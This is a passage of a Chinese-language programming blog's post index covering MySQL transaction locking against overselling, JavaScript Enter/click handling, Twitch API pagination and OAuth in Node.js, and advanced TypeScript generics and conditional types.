把上面這段想成是「搶門票的系統」，而現在只剩下一張票。接著再假設現在有 10 個人「同時」對系統發出 request，那會發生什麼事？ 這邊用 Apache JMeter 來做測試： 可以看到最後有 3 個人都買到票了，為什麼會這樣？這個叫做 race condition，可以參考我寫的這篇文章：理解什麼是 race-condition。 總之呢，這樣會造成超賣的問題，這明顯問題很大。所以才要有「Lock」機制。 簡單來說，lock 就是在一個 transaction 還沒完成以前都給鎖住，讓它不能做其他事情。這樣才能避免掉像上面那種問題。 所以可以這樣改寫程式碼： 附註：記得 lock 必須搭配 transaction 才可以用 123456789101112131415161718192021// 關閉自動 commit $conn-&gt;autocommit(false);// 建立一個 transaction$conn-&gt;begin_transaction();// 加上 lock (後面的 for updata)$stmt = $conn-&gt;prepare(\"SELECT amount from products where id = 1 for update\");$stmt-&gt;execute();$result = $stmt-&gt;get_result();if ($result-&gt;num_rows &gt; 0) { $row = $result-&gt;fetch_assoc(); echo \"amount: \" . $row['amount']; if ($row['amount'] &gt; 0) { $stmt = $conn-&gt;prepare(\"UPDATE products SET amount = amount - 1 WHERE id = 1\"); if ($stmt-&gt;execute()) { echo '購買成功'; } }}// 真正送出$conn-&gt;commit(); 一樣用 Apache JMeter 來測試： 現在真的只會有一個人搶到票了，不會再有超賣的問題。 以上就是 lock 的作用。另外在範例裡有指定 id = 1，這個叫做「row lock」，代表是以 row 為單位。如果想以 table 為單位也是 OK 的，把 id = 1 拿掉就行了，這樣就會 lock 住整個 table，變成「table lock」。 不過要注意用 lock 的話會有效能問題。因為當 A 跟 B 同時發 request，假設 A 排在前面，那 B 就要等 A 結束後才會輪到他，換句話說就是要等前一個做完才輪下一個啦，所以當然速度會變慢。","link":"/2022/03/03/transaction-and-lock/"},{"title":"讓 click 和 enter 觸發同個事件","text":"這招還不錯。 簡述在遇到表單的時候會希望除了「按下按鈕」以外還能支援「按下 Enter 鍵」。 但麻煩的地方在於一個必須綁 click 事件，一個必須綁 keypress 事件，並且要判斷使用者按下的是 Enter 才做處理，所以你可能會這樣寫： 1234&lt;div&gt; &lt;input type=\"text\"&gt; &lt;button&gt;send&lt;/button&gt;&lt;/div&gt; 12345678910111213141516171819// 輸入框document .querySelector('[type=text]') .addEventListener('keydown', handlerEnter)// 按鈕document .querySelector('button') .addEventListener('click', handlerClick)// click 的 handlerfunction handlerClick() { console.log('button click!')}// enter 的 handlerfunction handlerEnter(e) { if (e.key === 'Enter') { console.log('press enter!') }} 但通常兩個要做的事情都是一樣的，只差在 keypress 要判斷是不是 Enter 的流程，導致這兩個 function 沒辦法寫在一起，這很讓人傷腦筋。 讓你的腦袋轉個方向沒錯，可以轉個方向來思考，為什麼不讓「按下 enter 時自動執行 click 這個動作」就好？ 所以其實能改成這樣： 123456789101112131415161718// 輸入框document .querySelector('[type=text]') .addEventListener('keydown', (e) =&gt; { // 判斷是不是 Enter if (e.key === 'Enter') { // 是的話就把按鈕 click document.querySelector('button').click() }})// 按鈕document .querySelector('button') .addEventListener('click', handler)// 現在只要一個 handler 就夠了function handler() { console.log('click!')}","link":"/2022/01/22/trigger-an-event-on-click-and-enter/"},{"title":"串接 Twitch 的 API（挑戰題）","text":"來自 mentor-program-5th week4 的挑戰題。 解題方向這一題的目標是印出「最受歡迎的 200 個實況列表」，會用到的資料是這兩個： Get Games Get Streams 簡單來說就是先取得「遊戲 id」，再利用遊戲 id 去取得「實況資料」這樣子。 不過要注意 Get Streams 一次最多只能抓 100 筆資料，要取得 200 筆的話會變得複雜一點，所以我會建議先寫一個簡單版的，列出 100 筆實況列表就好，接著再來想要怎麼優化。 簡單版這裡要做的事情很簡單，我們只要做兩件事就好： 根據輸入去找出遊戲 id 拿遊戲 id 去找出實況列表 這裡就直接貼原始碼，步驟都寫在註解裡面了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/* 陽春版，可以取得 100 筆「最受歡迎的實況列表」*/// 載入 dotenv（取得環境變數）require('dotenv').config()// 發送 request 的模組const request = require('request')// API 網址const BASE_URL = 'https://api.twitch.tv/helix'// 取得遊戲 id 的 requestfunction searchGame(name, callback) { // 沒輸入遊戲名稱 if (!name) { return console.log('請輸入遊戲名稱') } request({ url: `${BASE_URL}/games?name=${name}`, headers: { 'Authorization': process.env.ACCESS_TOKEN, 'Client-ID': process.env.CLIENT_ID } }, callback)}// 拿到遊戲 id 的 callbackfunction handlerGameId(err, res, body) { // 錯誤處理 if (err) { return console.log(err) } // 拿到遊戲 id 後 const gameId = JSON.parse(body).data[0].id // 再發 request 取得實況列表 getStreams(gameId, handlerStreams)}// 取得實況列表的 requestfunction getStreams(gameId, callback) { // 沒輸入遊戲 id if (!gameId){ return console.log('請輸入遊戲 id') } request({ // 一次抓 100 筆 url: `${BASE_URL}/streams?first=100&amp;gamd_id=${gameId}`, headers: { 'Authorization': process.env.ACCESS_TOKEN, 'Client-ID': process.env.CLIENT_ID } }, callback)}// 拿到實況列表的 callbackfunction handlerStreams(err, res, body) { // 錯誤處理 if (err) { return console.log(err) } // 取出實況資料 const streams = JSON.parse(body).data // 印出實況主名稱、id for(let stream of streams) { console.log('==============') console.log(`實況主名稱：${stream.user_name}`) console.log(`實況主 id：${stream.user_id}`) console.log(`觀看人數：${stream.viewer_count}`) }}/* node twitch1.js 'League of Legends' 執行流程： 1. 送出請求，取得遊戲 id =&gt; searchGame 2. 拿到遊戲 id =&gt; handlerGameId (callback) 3. 利用遊戲 id 送出請求，取得實況列表 =&gt; getStreams 4. 拿到實況列表，並印出實況主名稱、id =&gt; handlerStreams (callback)*/searchGame(process.argv[2], handlerGameId) 比較重要的地方在於 執行順序，我們希望的順序是：handlerGameId 拿到 id 後才執行 getStreams 所以 getStreams 一定是在 handlerGameId 裡面被呼叫的，如果你寫在別的地方，結果一定是錯的，可以參考 理解什麼是 race-condition 困難版簡單版沒有問題的話，接下來要做的事情其實也不複雜，其實就是在發一次請求去找出第二筆實況列表資料這樣子而已。 可能會碰到的一個問題是「要怎麼抓第二筆實況資料？」 關於這個問題，你可以先觀察一下，在拿到第一筆實況資料的時候，資料裡有個 pagination 的欄位： 1234567891011{ \"data\": [ { \"id\": \"41375541868\", ... }, ], \"pagination\": { \"cursor\": \"eyJiIjp7IkN1cnNvciI6ImV5SnpJam8zT0RNMk5TNDBORFF4TlRjMU1UY3hOU3dpWkNJNlptRnNjMlVzSW5RaU9uUnlkV1Y5In0sImEiOnsiQ3Vyc29yIjoiZXlKeklqb3hOVGs0TkM0MU56RXhNekExTVRZNU1ESXNJbVFpT21aaGJITmxMQ0owSWpwMGNuVmxmUT09In19\" }} 裡面的那個 cursor 就是用來拿下一筆實況資料的時候需要用到的東西，我自己是把它當作一個「記錄點」的意思，或你也可以讀一下 API 文件的說明： Cursor for backward pagination: tells the server where to start fetching the next set of results, in a multi-page response. The cursor value specified here is from the pagination response field of a prior query. 簡單來說就是告訴後端「從哪裡開始撈資料」的意思啦！我們剛剛不是已經抓了 100 筆嗎？，所以第二次發請求時要加上 cursor 來告訴後端「我要從這裡開始拿資料哦（第 101 筆）」，大概是這樣的概念。 沒問題後，接下來就是思考解題方向： 送出請求，拿到遊戲 id 用遊戲 id 請求第一筆實況列表 拿到實況列表後，把第一筆資料存起來 用遊戲 id 請求第二筆實況列表，這次要加上 cursor，來從第 101 筆開始抓 拿到實況列表後，把第二筆資料存起來 把所有資料印出來 這裡要特別注意我們得新增兩個變數 gameId、allStreams 來儲存「遊戲 id」與「所有實況列表」。 為什麼？因為你在拿到第一筆實況資料的時候，callback 的參數裡是不會有遊戲 id 的，如果要在這個 callback 裡送出第二次請求，就一定要有遊戲 id 的這個值，所以才要建立一個變數來儲存。 至於 allStreams 也一樣，我們每次都只會拿到 100 筆實況資料，所以拿到資料的時候當然得存起來，最後才有辦法湊成 200 筆。 接下來一樣參考原始碼跟註解，應該都寫得蠻清楚的了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108// 載入 dotenv（取得環境變數）require('dotenv').config()// 發送 request 的模組const request = require('request')// API 網址const BASE_URL = 'https://api.twitch.tv/helix'// 儲存遊戲 id let gameId = null// 儲存所有實況列表資料let allStreams = []// 取得遊戲 id 的 requestfunction searchGame(name, callback) { // 沒輸入遊戲名稱 if (!name) return console.log('請輸入遊戲名稱') request({ url: `${BASE_URL}/games?name=${name}`, headers: { 'Authorization': process.env.ACCESS_TOKEN, 'Client-ID': process.env.CLIENT_ID } }, callback)}// 拿到遊戲 id 的 callbackfunction handlerGameId(err, res, body) { // 錯誤處理 if (err) { return console.log(err) } // 拿到遊戲 id 後，把 id 儲存起來。 gameId = JSON.parse(body).data[0].id // 接著發 request 取得第一筆實況列表 getFirstStreams(gameId, handlerFirstStreams)}// 取得第一筆實況列表的 requestfunction getFirstStreams(gameId, callback) { // 沒輸入遊戲 id if (!gameId){ return console.log('請輸入遊戲 id') } request({ // 一次抓 100 筆 url: `${BASE_URL}/streams?first=100&amp;gamd_id=${gameId}`, headers: { 'Authorization': process.env.ACCESS_TOKEN, 'Client-ID': process.env.CLIENT_ID } }, callback)}// 拿到第一筆實況列表的 callbackfunction handlerFirstStreams(err, res, body) { // 錯誤處理 if (err) { return console.log(err) } // 取出實況資料 const streams = JSON.parse(body).data // 取得記錄點位置（分頁） const cursor = JSON.parse(body).pagination.cursor // 把資料拼起來 allStreams = allStreams.concat(streams) // 再發一次請求，取得第二筆實況列表 getSecondStreams(gameId, cursor, handlerSecondStreams)}// 取得第二筆實況列表的 requestfunction getSecondStreams(gameId, cursor, callback) { // 沒有輸入 id 或 記錄點 if (!gameId || !cursor) return console.log('請輸入 id 及 記錄點') request({ url: `${BASE_URL}/streams?after=${cursor}&amp;first=100&amp;gamd_id=${gameId}`, headers: { 'Authorization': process.env.ACCESS_TOKEN, 'Client-ID': process.env.CLIENT_ID } }, callback)}// 取得第二筆實況列表的 callbackfunction handlerSecondStreams(err, res, body) { // 錯誤處理 if (err) { return console.log(err) } // 取出實況資料 const streams = JSON.parse(body).data // 把資料拼起來（這時候就有 200 筆資料了） allStreams = allStreams.concat(streams) // 印出實況主名稱、id 和觀看人數 for(let stream of allStreams) { console.log('=============') console.log(`實況主：${stream.user_name}`) console.log(`id：${stream.user_id}`) console.log(`觀看人數：${stream.viewer_count}`) }}/* 執行流程： 1. 發出請求，取得遊戲 id =&gt; searchGame 2. 拿到遊戲 id 後 =&gt; handlerGameId (callback) 3. 利用遊戲 id 發出請求，取得第一筆實況列表 =&gt; getFirstStreams 4. 拿到第一筆實況列表，把資料跟記憶點儲存起來 =&gt; handlerFirstStreams (callback) 5. 發出請求，取得第二筆實況列表 =&gt; getSecondStreams 6. 拿到第二筆實況列表，把資料儲存起來，最後印出內容 =&gt; handlerSecondStreams (callback)*/searchGame(process.argv[2], handlerGameId) 一樣要注意執行順序，只要是非同步的 function，結果都一定要用 callback 來處理。 困難版（優化）這裡是我慢慢修出來的，我也還不知道怎麼解釋比較好，所以請直接看註解： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125// 載入 dotenv（取得環境變數）require('dotenv').config()// 發送 request 的模組const request = require('request')// API 網址const BASE_URL = 'https://api.twitch.tv/helix'// 一次要抓的數量const BATCH_LIMIT = 50// 全部要抓的數量const TOTAL = 200// 取得遊戲 id 的 requestfunction searchGame(name, callback) { // 沒輸入遊戲名稱 if (!name) return console.log('請輸入遊戲名稱') request({ url: `${BASE_URL}/games?name=${name}`, headers: { 'Authorization': process.env.ACCESS_TOKEN, 'Client-ID': process.env.CLIENT_ID } }, callback)}// 拿到遊戲 id 的 callbackfunction handlerGameId(err, res, body) { // 錯誤處理 if (err) { return console.log(err) } // 拿到遊戲 id 後，把 id 儲存起來。 const gameId = JSON.parse(body).data[0].id // 取得所有實況列表，拿到後印出資料 getAllStreams(gameId, BATCH_LIMIT, TOTAL, handlerAllStream)}/* 取得所有實況列表 gameId: 遊戲 id limit: 一次抓幾筆資料 total: 總共有幾筆資料 callback: 成功的話會拿到所有實況列表的資料 備註： 這個 function 的用意其實是把 getStreams 跟 handlerStreams 給包裝起來， 這樣就可以把需要用到的變數都綁在裡面，例如 gameId、allStreams， 就不用再宣告成全域變數了*/function getAllStreams(gameId, limit, total, callback) { // 儲存所有實況列表資料 let allStreams = [] // 拿到部分實況資料的 callback，會重複使用所以才寫成命名函式 function handlerStreams(err, res, body) { // 錯誤處理 if (err) { return callback(err) } // 取出實況資料 const streams = JSON.parse(body).data // 取得記錄點位置（分頁） const cursor = JSON.parse(body).pagination.cursor // 把資料拼起來 allStreams = allStreams.concat(streams) // 還沒抓夠，在發一次請求，這次加上 cursor if (allStreams.length &lt; total) { // 遞迴 handlerStreams，直到數量抓夠為止 return getStreams(gameId, cursor, limit, handlerStreams) } // 夠了的話，切割成正確的數量在回傳，不然可能會有超過的問題 // 第一個參數是代表 error，後面才是真正要傳回去的資料 return callback(null, allStreams.slice(0, total)) } // 抓第一次資料 // 這個還沒有記憶點所以 cursor 傳入 null getStreams(gameId, null, limit, handlerStreams)}// 拿到所有實況列表後的 callbackfunction handlerAllStream(err, streams) { // 錯誤處理 if (err) { return console.log(err) } // 印出實況資訊 for (let stream of streams) { console.log('==============') console.log(`實況主名稱：${stream.user_name}`) console.log(`實況主 id：${stream.user_id}`) console.log(`觀看人數：${stream.viewer_count}`) }}// 取得部分實況列表的 requestfunction getStreams(gameId, cursor, limit, callback) { // 預設的 url let url = `${BASE_URL}/streams?first=${limit}&amp;gamd_id=${gameId}` // 沒輸入遊戲 id if (!gameId){ return console.log('請輸入遊戲 id') } // 如果有傳入記憶點，url 加上 after 參數 if (cursor) { url += `&amp;after=${cursor}` } request({ url: url, headers: { 'Authorization': process.env.ACCESS_TOKEN, 'Client-ID': process.env.CLIENT_ID } }, callback)}/* 執行流程： 1. 發出請求，取得遊戲 id =&gt; searchGame 2. 拿到遊戲 id 後 =&gt; handlerGameId (callback) 3. 利用遊戲 id 發出請求，取得所有的實況列表 =&gt; getAllStreams 4. 拿到所有實況列表後，印出實況資訊 =&gt; handlerAllStreams (callback)*/searchGame(process.argv[2], handlerGameId)","link":"/2022/01/09/twich-api-challenge/"},{"title":"串接 Twitch 的 API","text":"一個比較多驗證的 API，所以紀錄一下，不然以後要用又忘記怎麼用會很麻煩。 流程簡述簡單來說，你要先拿到這三樣東西： access_token client_id client_secret access_token 跟 client_id 都是要在 request header 裡面帶上的驗證碼，client_secret 是用來取得 access_token 的時候會用到。 流程： 註冊 twitch 帳號 在 twitch developer 網站上註冊一個 APP 在 APP 頁面裡面取得 client_id 跟 client_secret（這個要記得案新密碼才會產生） 取得驗證 token，有三種取得方式，我目前是用「Client credentials flow」。（每一種的差別可以參考 這裡） 取得驗證 token備註：本來偷懶想用 Postman 來做，但似乎會被 twitch 擋，一直拿到 403 Invalid client_secret 的回傳值。所以這邊建議還是乖乖用 Node.js 來發會比好。 就是這個部分比較麻煩，所以特別解釋一下。 按照 官方文件 的說明，你要帶上 client_id 跟 client_secret 這兩個參數發一個 POST 請求到 https://id.twitch.tv/oauth2/token 這個網站，接著就會吐給你 access_token，就是這麼簡單，簡單到我搞了一個下午。 所以就寫一個 request 來發請求： 12345678// 載入 request 套件const request = require('request')// 發出 post 請求request.post(`https://id.twitch.tv/oauth2/token?client_id=${你的client_id}&amp;client_secret=${你的cliend_secret}&amp;grant_type=client_credentials`,(error, response, body) =&gt; { console.log('statusCode:', response.statusCode) console.log('body:', body)}) 成功的話應該就會拿到 token： 12345{ \"access_token\":\"qwtjoiqjqwe2wqeqeyqieq\", // 這裡是我亂打的 \"expires_in\":4740717, \"token_type\":\"bearer\"} 快樂發 request最麻煩的部分完成後就能快樂串 API 了，這裡要串的是「最受歡迎的遊戲列表（Get Top Games）」，詳細說明可以 這裡 接下來就簡單紀錄一下，不多做解說。 備註：這裡把 access_token 跟 client_id 都藏在環境變數裡了，詳細可以參考這裡 1234567891011121314151617181920212223242526272829303132333435// 載入 dotenv（取得環境變數）require('dotenv').config()// 發送 request 的模組const request = require('request')// 資料數量const count = 20request({ method: 'GET', url: `https://api.twitch.tv/helix/games/top?first=${count}`, // 授權跟驗證 header headers: { // token 的格式一定要是「Bearer + ' ' + token」`(一定要大寫) \"authorization\": process.env.ACCESS_TOKEN, \"Client-ID\": process.env.CLIENT_ID }}, (error, response, body) =&gt; { if(error) { console.log('oops! 發生了一些錯誤！') console.log(error) return } if(response.statusCode &gt;= 200 &amp;&amp; response.statusCode &lt; 400) { console.log('statusCode:', response.statusCode) // 解析資料 const res = JSON.parse(body) // 印出內容 res.data.forEach(item =&gt; { console.log(Number(item.id), item.name) }) } else { console.log('請求失敗') console.log(JSON.parse(body)) }}) 輸出結果： 123456789101112131415161718192021statusCode: 200509658 Just Chatting21779 League of Legends491931 Escape from Tarkov516575 VALORANT511224 Apex Legends32982 Grand Theft Auto V29595 Dota 2498566 Slots512710 Call of Duty: Warzone33214 Fortnite513143 Teamfight Tactics26936 Music138585 Hearthstone1869092879 FIFA 22491487 Dead by Daylight27471 Minecraft513181 Genshin Impact32399 Counter-Strike: Global Offensive490100 LOST ARK509660 Art 題外話，League of Legends 真的是歷久不衰阿。","link":"/2022/01/07/twitch-api/"},{"title":"TypeScript－各種進階使用的技巧","text":"沒有 TypeScript 做不到的，只有你想不到的。 泛型搭配 extends範例一1234function getFirstElement&lt;T extends number&gt;(arr: T[]): T { const [first] = arr return first} extends 在這邊的意思是指「T 至少要滿足 number 這個 type」，而 arr 的 type 是 T[]，把兩個組合起來的意思就是： 傳入的值必須是「陣列」，且陣列中的元素必須為「number」。 所以用起來會是這樣： 1getFirstElement([1, 2, 3, 4]) 如果傳入不是 number 的 type 時就會編譯錯誤： 如果想要讓 T 也支援 string 的話可以改成這樣子： 1234function getFirstElement&lt;T extends number | string&gt;(arr: T[]): T { const [first] = arr return first} 這樣的意思就會變成： 傳入的值必須是「陣列」，且陣列中的元素必須為「number」或「string」。 所以現在傳入 string 陣列的話就不會出錯了： 12getFirstElement([1, 2, 3, 4]) // correct ✅getFirstElement(['A', 'B', 'C']) // correct ✅ 範例二假設現在有一個印出名字的 function，長這樣： 123function logPersonName(person) { console.log(`${person.firstName} ${person.lastName}`)} 然而當我們對這個 function 定義 type 時會碰到一個問題，因為通常 person 可能會有各式各樣的屬性，像這樣： 1234567891011type Person1 = { firstName: string lastName: string age: number}type Person2 = { firstName: string lastName: string gender: number} 所以如果要針對不同的 person 去定義 type 時，就得各別寫一個 function 來處理： 12345678// 給 Person1 用的 functionfunction logPersonName1(person: Person1): void { console.log(`${person.firstName} ${person.lastName}`)}// 給 Person2 用的 functionfunction logPersonName2(person: Person2): void { console.log(`${person.firstName} ${person.lastName}`)} 看到這邊應該會覺得這是很麻煩的做法吧？所以這時候聰明的你就會想說「阿，我可以用泛型來處理吧！」，接著寫出這樣的東西： 123function logPersonName&lt;T&gt;(person: T): void { console.log(`${person.firstName} ${person.lastName}`)} 然後就會看到這段錯誤訊息： 這裡有特別把 any 給框起來，是因為這就是主要原因。TS 的意思是說： 我知道你給了一個泛型，但是這個泛型的範圍實在是太「廣『泛』了」，因此我無法保證 firstName 和 lastName 會出現在 person 中。 為了讓 TS 確保 person 至少會有 firstName 和 lastName 這兩個屬性，我們可以用 extends 改寫成這樣子： 123456789type Person = { firstName: string lastName: string}// T 至少要出現 Person 中的屬性，所以 person 至少會有 firstName 和 lastNamefunction logPersonName&lt;T extends Person&gt;(person: T): void { console.log(`${person.firstName} ${person.lastName}`)} 這樣子就可以確保 firstName 和 lastName 存在，但又不會僅限於特定幾個 person 才能使用這個 function 了： 123456789101112// correct ✅logPersonName({ firstName: 'Pea', lastName: 'Nu', age: 20})// correct ✅logPersonName({ firstName: 'Pea', lastName: 'Nu', gender: 'man'}) 範例三如果要對 Type Alias 本身來限制泛型的話，可以這樣做： 1234567// 至少要出現的屬性type BasePerson = { firstName: string lastName: string}// 加上限制的泛型type GenericPerson&lt;T extends BasePerson&gt; = T 現在這個 GenericPerson 的用途就是： 給我一個 type(T)，我會回傳你一個新的 type。傳進來的 type 可以包含任何屬性，但前提是至少要有 firstName 和 lastName 屬性，否則不給過。 實際用起來會像這樣： 123456789type MyPerson = { firstName: string lastName: string age: 20 gender: 'man'}function logPersonName(person: GenericPerson&lt;MyPerson&gt;): void { console.log(`${person.firstName} ${person.lastName}`)} 如果現在把其中一個屬性拿掉的話，就會看到錯誤訊息： 這邊會看到兩個錯誤。 第一個是 person.lastName，這是因為 MyPerson 中並沒有 lastName，所以自然不該去存取這個屬性。 第二個是 GenericPerson&lt;MyPerson&gt;，因為 GenericPerson 中的 T 有用 extends 來限制傳入的 T 至少要有 firstName 和 lastName 兩個屬性，而 MyPerson 中沒有 lastName，所以就會出錯。 keyof 的使用如果你有一個 type 長這樣： 1234type Person = { firstName: string lastName: string} 這時候你只想要 Person 中的 key 的話可以用 keyof 來萃取： 123456type Person = { firstName: string lastName: string}// 'firstName' | 'lastName'type PersonKey = keyof Person 這邊你可能會有一個疑惑是為什麼不會顯示 'firstName' | 'lastName' 而是 keyof Person？這是因為在定義一個物件的 type 時它的 key 有可能會是 string、number 或 symbol 這三種類別： 這樣子 TS 就無法確保型別是什麼，所以才無法直接顯示 'firstName' | 'lastName'。 要解決這個問題的話可以搭配 &amp; string 來讓 TS 知道這邊的 key 是只會是 string 就行了： Indexd accessing如果你有一個 type 長這樣： 123456type Person = { firstName: string lastName: string age: number isMarried: boolean} 這時候你想把 firsName 的 type（string） 取出來的話，可以這樣做： 透過這種方式產生的 type 就稱為「Indexd accessing」。 如果想要取出「多個值」的話可以這樣寫： 接下來你要問說「如果我想要所有的值呢」，對嗎？在講解答前可以先想想看剛剛的邏輯，當我們想要取出 firstName 的 type 時會寫 Person['firstName']，想要 firstName 和 age 時會寫 Person['firstName' | 'age']，…以此類推。 也就是說，只要把所有 Person 的 key 都放到 [] 裡面的話就可以拿到所有屬性的 type。 有察覺到在暗示什麼嗎？其實就是前面的 keyof，只要寫成這樣就可以取出所有屬性的 type 了： generic &amp; keyof &amp; indexed access 綜合練習這邊是測試你對前面的東西有沒有熟悉，只要懂這三樣東西後就能做出蠻方便的東西。 這裡要實作的是一個用來取出物件屬性值的 function，用起來會像這樣： 123456789const person = { firstName: 'Pea', lastName: 'Nu', age: 24}getObjectValue(person, 'firstName') // 'Pea'getObjectValue(person, 'lastName') // 'Nu'getObjectValue(person, 'age') // 24 但我希望除了基本的功能以外，它還要有底下的功能： 1. 避免傳入不正確的 key： 2. 可以自動顯示能傳入哪些值： 這功能其實還蠻方便的吧？來看看這是怎麼做出來的。 首先這個 function 原本應該是長這樣子： 123function getObjectValue(obj: any, key: any) { return obj[key]} 一開始可以先不用考慮泛型的部分，我們先做簡單一點的版本就好。 如果只是單純想把 obj 跟 key 限制在一定某個範圍的話，我們只要建立一個實際的 type 來限制即可，像這樣： 1234567891011// 建立一個 Person typetype Person = { firstName: string lastName: string age: number}// obj 限制為 Person，key 限制為 Person 中的所有屬性function getObjectValue(obj: Person, key: keyof Person) { return obj[key]} 這樣子其實就能實現上面的兩種功能了，現在第二個參數只能傳入 firstName、lastName、age ，並且有自動提示的功能。 問題在於今天如果想傳入的 obj 不是 Person 這個 type 的話就沒辦法用了： （改傳入另一個叫做 car 的物件） 雖然可以幫每一個物件建立一個不同的 function 來處理，但那樣子有點不切實際，畢竟邏輯明明都一樣。 這時候泛型就很好用了，既然 obj 會隨著傳入的值而改變，我們就把會「改變」的地方變成泛型就好了： 12345678910111213141516171819202122232425type Person = { firstName: string lastName: string age: number}// 改成 T（泛型）function getObjectValue&lt;T&gt;(obj: T, key: keyof T) { return obj[key]}const person = { firstName: 'Pea', lastName: 'Nu', age: 24}const car = { brand: 'Toyota', type: 'SUV', id: 'CTY-1268'}getObjectValue(car, 'brand')getObjectValue(person, 'firstName') 這樣就不會出現錯誤訊息了： 做到這邊其實就完成一開始想要的功能了，我們可以傳入任何物件，並且只能傳入對應的 key，也能有提示的功能。 幫 key 加上限制如果現在想要把可以傳入的 key 加上限制，像這樣子： 1234// 只能傳入 'age' 這個 keygetObjectValue&lt;Person, 'age'&gt;(person, 'age')// 傳入 'age' 以外的 key 會出錯getObjectValue&lt;Person, 'age'&gt;(person, 'firstName') 這邊給幾個提示，可以先自己思考看看後再往下看解答： 需要第二個泛型，用來當作 key 的 type 第二個泛型必須要有一定的限制，否則會因為太廣泛而出問題 1234// 加入第二個泛型 U，並且限制 U 只能傳入 T 的 keyfunction getObjectValue&lt;T, U extends keyof T&gt;(obj: T, key: U): T[U] { return obj[key]} 稍微解釋一下這邊的流程： 先把 key 的 type 變成 U，讓 key 變成是可以自訂的 type 利用 extends 把 U 的範圍限制在 T 的 key，以免傳入不存在 T 身上的 key 最後可以注意到回傳值的部分：T[U]。 因為我們最後會回傳的是「T 這個物件的 value」，而如果要表示這個 value 的 type 的話會用 T[...] 來表示，例如 T['firstName'] 會是 string，T['age'] 會是 number。只是現在我們把 [...] 的部分也變成是泛型了，所以就會變成 T[U]。 這一段可能有點抽象，建議可以回憶一下之前的範例並練習看看會比較好理解一點。 Utility Type在寫專案的時候我們通常會有一種 function 是「把某個值丟進去，再輸出成想要的結果」，這種東西就稱為「Utility」。而這種觀念也可以套用到 TS 上，只是會變成「把某個 type 丟進去，再輸出成另外一個 type」。 底下附上幾個簡單的範例，只要前面的觀念有弄懂應該就不會覺得複雜： 123456789101112131415161718192021222324// sampletype Manufacture = 'Apple' | 'Google' | 'Samsung' | 'Sony'type Product = { name: string price: number manufacture: Manufacture isLaunched: boolean}// utilitytype OrNull&lt;T&gt; = T | nulltype OneOrMany&lt;T&gt; = T | T[]type OneOrManyOrNull&lt;T&gt; = T | T[] | nulltype Keys&lt;T&gt; = keyof T &amp; stringtype Values&lt;T&gt; = T[keyof T]type PickObj&lt;T, U extends keyof T&gt; = T[U]// outputtype ProductOrNull = OrNull&lt;Product&gt; // Product | nulltype ManufactureOrManufactures = OneOrMany&lt;Manufacture&gt; // 'Apple | ['Apple']type ManufactureOrManufacturesOrNull = OneOrManyOrNull&lt;Manufacture&gt; // 'Apple | ['Apple'] | nulltype KeysOfProduct = Keys&lt;Product&gt; // 'Apple' | 'Google' | 'Samsung' | 'Sony'type ValuesOfProduct = Values&lt;Product&gt; // string | number | booleantype PickedProduct = PickObj&lt;Product, 'manufacture'&gt; // \"Apple\" | \"Google\" | \"Samsung\" | \"Sony\" 每個 utility 會輸出的結果： OrNull 某個 type 或是 null OneOrMany 單一或陣列形式的 type OneOrManyNull 單一或陣列形式或 null 的 type Keys 只取出 key 的 type Values 只取出屬性值的 type PickObj 取出指定屬性值的 type Conditional Types在 TS 中可以像 JS 一樣用三元運算子來計算出最後的值，只是一個是回傳「值」，一個是回傳「型別（type）」。 來看個簡單的範例： 1234// SomeType1 的型別是 'PeaNu' 這個字串type SomeType1 = 'PeaNu'// 如果 SomeType1 是 string 的子集合，回傳型別 true，反之則回傳 falsetype NewType1 = SomeType1 extends string ? true : false 出來的結果會是這樣： 這段如果還記得 extends 的用途應該就不難理解，意思是「如果 SomeType1 的型別有出現在 string 的子集合裡，就回傳 true 來當作新的型別，反之則回傳 false。 而 PeaNu 雖然是一個固定的字串值，但它當然符合 string 這個條件，所以最後的型別就會是 true。 Flatten接著是 TS 官方提供的一個範例： 跟剛剛的範例差不多，但可能會有疑惑的地方是 T[number]，這個先不用的心，後面會再回來解釋。 把這段型別翻成白話的意思是「如果傳進來的 T 是陣列型別，就回傳 T[number]，否則直接回傳原本的 T。 所以我們可以來做個測試： 1234type Flatten&lt;T&gt; = T extends any[] ? T[number] : Ttype Manufacture = 'Apple' | 'Google' | 'Samsung' | 'Sony'// 把 T 傳入一個非陣列的型別type FlattenManufacture = Flatten&lt;Manufacture&gt; 結果就會跟剛剛預期的一樣，會是 T 原本的型別： 那如果現在改傳入陣列型別呢？ 1234type Flatten&lt;T&gt; = T extends any[] ? T[number] : Ttype Manufacture = 'Apple' | 'Google' | 'Samsung' | 'Sony'[]// 把 T 傳入一個陣列的型別type FlattenManufacture = Flatten&lt;Manufacture&gt; 會發現陣列被「拿掉了」： 這個其實就是 Flatten 的真正的用途：「把陣列中的元素型別抽出來」。 不太懂的話可以再來看個例子： 1234type Flatten&lt;T&gt; = T extends any[] ? T[number] : T// 一樣傳入陣列型別type Manufacture = ['a', false, null]type FlattenManufacture = Flatten&lt;Manufacture&gt; 輸出結果： 關於 T[number]搞懂了上面的 Conditional Type 後，現在回來談一下 T[number] 的部分。剛剛你可能會有疑惑的地方是「為什麼用了 T[number] 就可以把陣列元素的型別拿出來？」 這是因為當一個型別是陣列時，他的 index 值一定會是「數字」，所以我們可以透過這些數字來取出對應的元素： 12345type Manufacture = ['a', false, null]type Manufacture1 = Manufacture[0] // 'a'type Manufacture2 = Manufacture[1] // falsetype Manufacture3 = Manufacture[2] // 'a' 但當我們想要指向陣列中的所有元素時不會是一個特定的數字，所以這時候只要把 index 指定為 number 即可： 1type ManufactureAll = Manufacture[number] // false | \"a\" | null 分配律的概念我們先來看一個官方提供的 utility：Extract，它的原始碼如下： 意思是說「當 T 為 U 的子集合時，回傳 T 的型別，反之回傳 never」。 實際使用起來會像這樣子： 12345type Collection = 'a' | 'b'type T1 = Extract&lt;'a' | 'b' | 'c', Collection&gt; // 'a' | 'b'type T2 = Extract&lt;'a' | 'b' | 'c' | 'd', Collection&gt; // 'a' | 'b'type T3 = Extract&lt;'b' | 'c' | 'd' | 'e', Collection&gt; // 'b' 先來看 T1，能看到 a 和 b 因為有出現在 Collection 的集合中，所以會被留下，而 c 因為不屬於 